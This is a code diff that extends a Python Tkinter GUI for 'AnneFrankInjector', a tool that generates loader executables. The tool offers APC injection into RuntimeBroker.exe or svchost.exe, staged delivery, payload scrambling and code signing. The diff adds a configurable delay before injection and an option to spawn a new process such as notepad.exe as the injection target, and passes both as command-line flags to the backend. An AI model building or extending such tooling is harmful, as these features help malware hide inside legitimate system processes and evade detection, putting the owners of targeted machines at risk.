@@ -14,7 +14,7 @@ class AnneFrankGUI:
     def __init__(self, root):
         self.root = root
         self.root.title("AnneFrankInjector - GUI")
-        self.root.geometry("720x650")
+        self.root.geometry("720x720")  # slightly taller to accommodate new controls
 
         # Determine which backend to use
         self.os_name = platform.system()
@@ -80,16 +80,32 @@ class AnneFrankGUI:
         # ---------- APC target ----------
         ttk.Label(main_frame, text="APC injection target:").grid(row=6, column=0, sticky="w")
         self.apc = tk.StringVar(value="RuntimeBroker.exe")
-        ttk.Combobox(main_frame, textvariable=self.apc, values=["RuntimeBroker.exe", "svchost.exe"], state="readonly").grid(row=6, column=1, sticky="w")
+        apc_combo = ttk.Combobox(main_frame, textvariable=self.apc,
+                                 values=["RuntimeBroker.exe", "svchost.exe"],
+                                 state="normal", width=20)
+        apc_combo.grid(row=6, column=1, sticky="w")
 
         # ---------- Output name ----------
         ttk.Label(main_frame, text="Output name (without extension):").grid(row=7, column=0, sticky="w")
         self.output_name = tk.StringVar(value="afloader")
         ttk.Entry(main_frame, textvariable=self.output_name).grid(row=7, column=1, sticky="w")
 
+        # ---------- Delay ----------
+        ttk.Label(main_frame, text="Delay before injection (seconds):").grid(row=8, column=0, sticky="w")
+        self.delay = tk.StringVar(value="0")
+        ttk.Entry(main_frame, textvariable=self.delay, width=10).grid(row=8, column=1, sticky="w")
+
+        # ---------- Spawn new process ----------
+        self.spawn = tk.BooleanVar()
+        ttk.Checkbutton(main_frame, text="Spawn new process for injection", variable=self.spawn).grid(row=9, column=0, columnspan=2, sticky="w")
+
+        self.spawn_path = tk.StringVar(value="C:\\Windows\\System32\\notepad.exe")
+        ttk.Label(main_frame, text="Process path:").grid(row=10, column=0, sticky="w")
+        ttk.Entry(main_frame, textvariable=self.spawn_path, width=40).grid(row=10, column=1, sticky="w")
+
         # ---------- Code signing ----------
         signing_frame = ttk.LabelFrame(main_frame, text="Code Signing")
-        signing_frame.grid(row=8, column=0, columnspan=3, sticky="ew", pady=5)
+        signing_frame.grid(row=11, column=0, columnspan=3, sticky="ew", pady=5)
 
         ttk.Label(signing_frame, text="Certificate source:").grid(row=0, column=0, sticky="w")
         self.cert_source = tk.StringVar(value="none")
@@ -118,16 +134,16 @@ class AnneFrankGUI:
 
         # ---------- Generate button ----------
         self.gen_button = ttk.Button(main_frame, text="Generate Loader", command=self.generate)
-        self.gen_button.grid(row=9, column=0, columnspan=3, pady=10)
+        self.gen_button.grid(row=12, column=0, columnspan=3, pady=10)
 
         # ---------- Output text area ----------
-        ttk.Label(main_frame, text="Output:").grid(row=10, column=0, sticky="w")
+        ttk.Label(main_frame, text="Output:").grid(row=13, column=0, sticky="w")
         self.output_text = ScrolledText(main_frame, height=15, width=80)
-        self.output_text.grid(row=11, column=0, columnspan=3, sticky="nsew")
+        self.output_text.grid(row=14, column=0, columnspan=3, sticky="nsew")
 
         # Configure resizing
         main_frame.columnconfigure(1, weight=1)
-        main_frame.rowconfigure(11, weight=1)
+        main_frame.rowconfigure(14, weight=1)
 
         # Bind mode change to show/hide staged frame
         self.mode.trace_add("write", self.toggle_staged_frame)
@@ -178,6 +194,23 @@ class AnneFrankGUI:
                 messagebox.showerror("Error", "Port must be a number.")
                 return
 
+        # Validate delay (must be integer >= 0)
+        try:
+            delay_val = int(self.delay.get())
+            if delay_val < 0:
+                raise ValueError
+        except ValueError:
+            messagebox.showerror("Error", "Delay must be a non‑negative integer.")
+            return
+
+        # Validate spawn path if spawn is enabled
+        if self.spawn.get():
+            spawn_path = self.spawn_path.get().strip()
+            if not spawn_path:
+                messagebox.showerror("Error", "Please specify a process path for spawn injection.")
+                return
+            # Optional: check that it's a valid path (not empty)
+
         # Check signing
         src = self.cert_source.get()
         if src != "none":
@@ -211,6 +244,18 @@ class AnneFrankGUI:
                 cmd.append("-e")
             if self.scramble.get():
                 cmd.append("-s")
+
+            # Add delay if non-zero
+            delay_val = int(self.delay.get())
+            if delay_val > 0:
+                cmd.extend(["--delay", str(delay_val)])
+
+            # Add spawn arguments if enabled
+            if self.spawn.get():
+                cmd.append("--spawn")
+                spawn_path = self.spawn_path.get().strip()
+                if spawn_path:
+                    cmd.extend(["--spawn-path", spawn_path])
 
             src = self.cert_source.get()
             if src != "none":
